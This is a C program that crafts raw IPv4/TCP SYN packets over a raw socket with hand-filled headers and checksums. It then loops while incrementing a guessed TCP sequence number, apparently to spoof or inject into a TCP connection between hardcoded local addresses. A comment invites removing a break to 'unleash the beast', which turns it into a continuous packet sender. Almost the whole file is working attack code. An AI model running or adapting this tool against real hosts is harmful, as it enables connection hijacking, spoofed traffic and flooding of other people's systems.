#ifdef RUN_LOCAL
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h> //memset()
#include <unistd.h> //sleep()

//Socket stuff
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

//IP header (struct iphdr) definition
#include <linux/ip.h>
//TCP header (struct tcphdr) definition
#include <linux/tcp.h>

//Perhaps these headers are more general
//#include <netinet/tcp.h>
//#include <netinet/ip.h>
#else
#include <lib.h>
#endif

//Data to be sent (appended at the end of the TCP header)
#define DATA "datastring"

//Debug function: dump 'index' bytes beginning at 'buffer'
void hexdump(unsigned char *buffer, unsigned long index) {
  unsigned long i;
#ifdef RUN_LOCAL
  printf("hexdump on address %p:\n", buffer);
#else
  puts("hexdump on address ");
  puth((unsigned long long)buffer, 16);
  puts(":\r\n");
#endif
  for (i=0;i<index;i++)
  {
#ifdef RUN_LOCAL
    printf("%02x ",buffer[i]);
#else
    puth(buffer[i], 2);
    putchar(' ');
#endif
  }
#ifdef RUN_LOCAL
  printf("\n");
#else
  puts("\r\n");
#endif
}

//Calculate the TCP header checksum of a string (as specified in rfc793)
//Function from http://www.binarytides.com/raw-sockets-c-code-on-linux/
unsigned short csum(unsigned short *ptr,int nbytes) {
  long sum;
  unsigned short oddbyte;
  short answer;

  //Debug info
  //hexdump((unsigned char *) ptr, nbytes);
  //printf("csum nbytes: %d\n", nbytes);
  //printf("csum ptr address: %p\n", ptr);

  sum=0;
  while(nbytes>1) {
    sum+=*ptr++;
    nbytes-=2;
  }
  if(nbytes==1) {
    oddbyte=0;
    *((unsigned char *)&oddbyte)=*(unsigned char *)ptr;
    sum+=oddbyte;
  }

  sum = (sum>>16)+(sum & 0xffff);
  sum = sum + (sum>>16);
  answer=(short)~sum;

  return(answer);
}


//Pseudo header needed for calculating the TCP header checksum
struct pseudoTCPPacket {
  unsigned int srcAddr;
  unsigned int dstAddr;
  unsigned char zero;
  unsigned char protocol;
  unsigned short TCP_len;
};

int main(int argc, char **argv) {
  int sock, bytes, one = 1;
  struct iphdr *ipHdr;
  struct tcphdr *tcpHdr;

  //Setup
  char *srcIP = "192.168.0.101";
  char *dstIP = "192.168.0.105";
  int dstPort = 30000;
  int srcPort = 30001;

  //Initial guess for the SEQ field of the TCP header
  unsigned int initSeqGuess = 1138083240;

  //Data to be appended at the end of the tcp header
  char *data;

  //Ethernet header + IP header + TCP header + data
  char packet[512];

  //Address struct to sendto()
  struct sockaddr_in addr_in;

  //Pseudo TCP header to calculate the TCP header's checksum
  struct pseudoTCPPacket pTCPPacket;

  //Pseudo TCP Header + TCP Header + data
  char *pseudo_packet;

#ifdef RUN_LOCAL
  //Raw socket without any protocol-header inside
  if((sock = socket(PF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
    perror("Error while creating socket");
    exit(-1);
  }

  //Set option IP_HDRINCL (headers are included in packet)
  if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one)) < 0) {
    perror("Error while setting socket options");
    exit(-1);
  }

  //Populate address struct
  addr_in.sin_family = AF_INET;
  addr_in.sin_port = htons(dstPort);
  addr_in.sin_addr.s_addr = inet_addr(dstIP);
#endif

  //Allocate mem for ip and tcp headers and zero the allocation
  memset(packet, 0, sizeof(packet));
  ipHdr = (struct iphdr *) packet;
  tcpHdr = (struct tcphdr *) (packet + sizeof(struct iphdr));
  data = (char *) (packet + sizeof(struct iphdr) + sizeof(struct tcphdr));
  strcpy(data, DATA);

  //Populate ipHdr
  ipHdr->ihl = 5; //5 x 32-bit words in the header
  ipHdr->version = 4; // ipv4
  ipHdr->tos = 0;// //tos = [0:5] DSCP + [5:7] Not used, low delay
  ipHdr->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data); //total lenght of packet. len(data) = 0
  ipHdr->id = htons(54321); // 0x00; //16 bit id
  ipHdr->frag_off = 0x00; //16 bit field = [0:2] flags + [3:15] offset = 0x0
  ipHdr->ttl = 0xFF; //16 bit time to live (or maximal number of hops)
  ipHdr->protocol = IPPROTO_TCP; //TCP protocol
  ipHdr->check = 0; //16 bit checksum of IP header. Can't calculate at this point
  ipHdr->saddr = inet_addr(srcIP); //32 bit format of source address
  ipHdr->daddr = inet_addr(dstIP); //32 bit format of source address

  //Now we can calculate the check sum for the IP header check field
  ipHdr->check = csum((unsigned short *) packet, ipHdr->tot_len);
#ifdef RUN_LOCAL
  printf("IP header checksum: %d\n\n\n", ipHdr->check);
#else
  puts("IP header checksum: ");
  puth(ipHdr->check, 4);
  puts("\r\n\r\n\r\n");
#endif

  //Populate tcpHdr
  tcpHdr->source = htons(srcPort); //16 bit in nbp format of source port
  tcpHdr->dest = htons(dstPort); //16 bit in nbp format of destination port
  tcpHdr->seq = 0x0; //32 bit sequence number, initially set to zero
  tcpHdr->ack_seq = 0x0; //32 bit ack sequence number, depends whether ACK is set or not
  tcpHdr->doff = 5; //4 bits: 5 x 32-bit words on tcp header
  tcpHdr->res1 = 0; //4 bits: Not used
  tcpHdr->cwr = 0; //Congestion control mechanism
  tcpHdr->ece = 0; //Congestion control mechanism
  tcpHdr->urg = 0; //Urgent flag
  tcpHdr->ack = 0; //Acknownledge
  tcpHdr->psh = 0; //Push data immediately
  tcpHdr->rst = 0; //RST flag
  tcpHdr->syn = 1; //SYN flag
  tcpHdr->fin = 0; //Terminates the connection
  tcpHdr->window = htons(155);//0xFFFF; //16 bit max number of databytes 
  tcpHdr->check = 0; //16 bit check sum. Can't calculate at this point
  tcpHdr->urg_ptr = 0; //16 bit indicate the urgent data. Only if URG flag is set

  //Now we can calculate the checksum for the TCP header
  pTCPPacket.srcAddr = inet_addr(srcIP); //32 bit format of source address
  pTCPPacket.dstAddr = inet_addr(dstIP); //32 bit format of source address
  pTCPPacket.zero = 0; //8 bit always zero
  pTCPPacket.protocol = IPPROTO_TCP; //8 bit TCP protocol
  pTCPPacket.TCP_len = htons(sizeof(struct tcphdr) + strlen(data)); // 16 bit length of TCP header

  //Populate the pseudo packet
  pseudo_packet = (char *) malloc((int) (sizeof(struct pseudoTCPPacket) + sizeof(struct tcphdr) + strlen(data)));
  memset(pseudo_packet, 0, sizeof(struct pseudoTCPPacket) + sizeof(struct tcphdr) + strlen(data));

  //Copy pseudo header
  memcpy(pseudo_packet, (char *) &pTCPPacket, sizeof(struct pseudoTCPPacket));
 
  //Send lots of packets
  while(1) { 
    //Try to gyess TCP seq
    tcpHdr->seq = htonl(initSeqGuess++);

    //Calculate check sum: zero current check, copy TCP header + data to pseudo TCP packet, update check
    tcpHdr->check = 0;

    //Copy tcp header + data to fake TCP header for checksum
    memcpy(pseudo_packet + sizeof(struct pseudoTCPPacket), tcpHdr, sizeof(struct tcphdr) + strlen(data));

    //Set the TCP header's check field
    tcpHdr->check = (csum((unsigned short *) pseudo_packet, (int) (sizeof(struct pseudoTCPPacket) + 
          sizeof(struct tcphdr) +  strlen(data))));

#ifdef RUN_LOCAL
    printf("TCP Checksum: %d\n", (int) tcpHdr->check);
#else
    puts("TCP Checksum: ");
    puth((int) tcpHdr->check, 8);
    puts("\r\n");
#endif

    //Finally, send packet
#ifdef RUN_LOCAL
    if((bytes = sendto(sock, packet, ipHdr->tot_len, 0, (struct sockaddr *) &addr_in, sizeof(addr_in))) < 0) {
      perror("Error on sendto()");
    } else {
      printf("Success! Sent %d bytes.\n", bytes);
    }
#else
    
#endif

    printf("SEQ guess: %u\n\n", initSeqGuess);

    //I'll sleep when I'm dead
    //sleep(1);

    //Comment out this break to unleash the beast
    break;
  }
  
  return 0;
}
